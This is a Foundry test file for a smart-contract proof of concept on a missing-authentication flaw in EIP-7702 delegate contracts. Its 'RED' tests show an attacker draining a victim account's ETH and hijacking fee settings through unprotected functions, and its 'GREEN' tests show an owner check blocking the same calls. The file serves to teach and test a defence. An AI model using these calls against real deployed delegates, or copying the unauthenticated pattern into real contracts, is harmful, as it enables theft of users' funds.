// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/vulnerable/DC04_NoAuthDelegate.sol";
import "../src/fixed/DC04_AuthDelegate.sol";

/**
 * @title DC04_MissingAuthTest
 * @notice PoC tests for DC-04: Missing per-call authentication
 * @author Aditya Chotaliya [adityachotaliya.xyz]
 *
 * Core insight: In EIP-7702, ANY external account can call the EOA address,
 * which triggers DELEGATECALL into the delegate. If the delegate has functions
 * with no msg.sender check, any caller can invoke them - not just the EOA owner.
 */
contract DC04_MissingAuthTest is Test {
    address payable public victimEOA;
    address public attacker;
    address public legitimateFeeRecipient;

    DC04_NoAuthDelegate public vulnDelegate;
    DC04_AuthDelegate   public safeDelegate;

    function setUp() public {
        victimEOA             = payable(makeAddr("victimEOA"));
        attacker              = makeAddr("attacker");
        legitimateFeeRecipient = makeAddr("legitimateFeeRecipient");

        vm.deal(victimEOA, 5 ether);

        vulnDelegate = new DC04_NoAuthDelegate();
        safeDelegate = new DC04_AuthDelegate();
    }

    // =========================================================================
    // RED TESTS - missing auth on vulnerable delegate
    // =========================================================================

    /**
     * @notice RED: Attacker drains ETH directly via unprotected transferETH()
     */
    function test_RED_AnyoneCanTransferETH() public {
        console.log("=== DC-04 MISSING AUTH: ETH DRAIN ===");

        _etch7702(victimEOA, address(vulnDelegate));
        vm.prank(victimEOA);
        DC04_NoAuthDelegate(victimEOA).initialize(victimEOA, legitimateFeeRecipient);

        uint256 victimBefore   = victimEOA.balance;
        uint256 attackerBefore = attacker.balance;
        console.log("Victim ETH before:", victimBefore / 1e18, "ETH");

        // Attacker calls transferETH with NO auth check stopping them
        vm.prank(attacker);
        DC04_NoAuthDelegate(victimEOA).transferETH(payable(attacker), victimEOA.balance);

        console.log("Victim ETH after:", victimEOA.balance / 1e18, "ETH");
        console.log("Attacker ETH gained:", (attacker.balance - attackerBefore) / 1e18, "ETH");

        assertEq(victimEOA.balance, 0, "Victim fully drained - no auth check");
        assertEq(attacker.balance - attackerBefore, victimBefore, "Attacker has all victim ETH");
    }

    /**
     * @notice RED: Attacker redirects fees to themselves silently
     *
     * No ETH stolen immediately, but all future fee payments go to attacker.
     * Victim may not notice for a long time.
     */
    function test_RED_AttackerRedirectsFees() public {
        console.log("=== DC-04 MISSING AUTH: FEE HIJACK ===");

        _etch7702(victimEOA, address(vulnDelegate));
        vm.prank(victimEOA);
        DC04_NoAuthDelegate(victimEOA).initialize(victimEOA, legitimateFeeRecipient);

        address feeBefore = DC04_NoAuthDelegate(victimEOA).getFeeRecipient();
        console.log("Fee recipient before:", feeBefore);
        assertEq(feeBefore, legitimateFeeRecipient, "Starts with legitimate recipient");

        // Attacker silently redirects all fees to themselves
        vm.prank(attacker);
        DC04_NoAuthDelegate(victimEOA).setFeeRecipient(attacker);

        address feeAfter = DC04_NoAuthDelegate(victimEOA).getFeeRecipient();
        console.log("Fee recipient after:", feeAfter);

        assertEq(feeAfter, attacker, "HIJACK: attacker now receives all fees");
        assertTrue(feeAfter != legitimateFeeRecipient, "Legitimate recipient bypassed");
    }

    /**
     * @notice RED: Attacker sets fee to 100% to steal all proceeds
     */
    function test_RED_AttackerMaximizesFee() public {
        _etch7702(victimEOA, address(vulnDelegate));
        vm.prank(victimEOA);
        DC04_NoAuthDelegate(victimEOA).initialize(victimEOA, legitimateFeeRecipient);

        uint256 feeBefore = DC04_NoAuthDelegate(victimEOA).getFeePercent();
        assertEq(feeBefore, 100, "Starts at 1% (100 bps)");

        // Attacker sets fee to 100% AND redirects recipient to themselves
        vm.startPrank(attacker);
        DC04_NoAuthDelegate(victimEOA).setFeePercent(10000); // 100%
        DC04_NoAuthDelegate(victimEOA).setFeeRecipient(attacker);
        vm.stopPrank();

        assertEq(DC04_NoAuthDelegate(victimEOA).getFeePercent(), 10000, "Fee is now 100%");
        assertEq(DC04_NoAuthDelegate(victimEOA).getFeeRecipient(), attacker, "All fees go to attacker");

        console.log("=== Attacker set fee to 100% and redirected to themselves ===");
    }

    // =========================================================================
    // GREEN TESTS - onlyOwner blocks all unauthorized calls
    // =========================================================================

    /**
     * @notice GREEN: Attacker CANNOT call transferETH on safe delegate
     */
    function test_GREEN_TransferETHBlockedForNonOwner() public {
        console.log("=== DC-04 FIXED: onlyOwner blocks attacker ===");

        _etch7702(victimEOA, address(safeDelegate));
        vm.prank(victimEOA);
        DC04_AuthDelegate(victimEOA).initialize(victimEOA, legitimateFeeRecipient);

        uint256 balanceBefore = victimEOA.balance;

        vm.prank(attacker);
        vm.expectRevert("DC04: not owner");
        DC04_AuthDelegate(victimEOA).transferETH(payable(attacker), 1 ether);

        assertEq(victimEOA.balance, balanceBefore, "Balance untouched");
        console.log("Attacker blocked. Victim ETH safe:", victimEOA.balance / 1e18, "ETH");
    }

    /**
     * @notice GREEN: Attacker CANNOT redirect fees on safe delegate
     */
    function test_GREEN_FeeRedirectBlockedForNonOwner() public {
        _etch7702(victimEOA, address(safeDelegate));
        vm.prank(victimEOA);
        DC04_AuthDelegate(victimEOA).initialize(victimEOA, legitimateFeeRecipient);

        vm.prank(attacker);
        vm.expectRevert("DC04: not owner");
        DC04_AuthDelegate(victimEOA).setFeeRecipient(attacker);

        assertEq(DC04_AuthDelegate(victimEOA).getFeeRecipient(), legitimateFeeRecipient, "Fee recipient unchanged");
    }

    /**
     * @notice GREEN: Owner CAN call privileged functions
     */
    function test_GREEN_OwnerCanCallPrivilegedFunctions() public {
        _etch7702(victimEOA, address(safeDelegate));
        vm.prank(victimEOA);
        DC04_AuthDelegate(victimEOA).initialize(victimEOA, legitimateFeeRecipient);

        address newRecipient = makeAddr("newRecipient");

        // Owner (victimEOA) can change fee recipient
        vm.prank(victimEOA);
        DC04_AuthDelegate(victimEOA).setFeeRecipient(newRecipient);
        assertEq(DC04_AuthDelegate(victimEOA).getFeeRecipient(), newRecipient, "Owner can update recipient");

        // Owner can transfer ETH
        address payable dest = payable(makeAddr("dest"));
        vm.prank(victimEOA);
        DC04_AuthDelegate(victimEOA).transferETH(dest, 1 ether);
        assertEq(dest.balance, 1 ether, "Owner can transfer ETH");

        console.log("=== Owner retains full control, attacker has none ===");
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    function _etch7702(address eoa, address delegate) internal {
        vm.etch(eoa, delegate.code);
    }
}
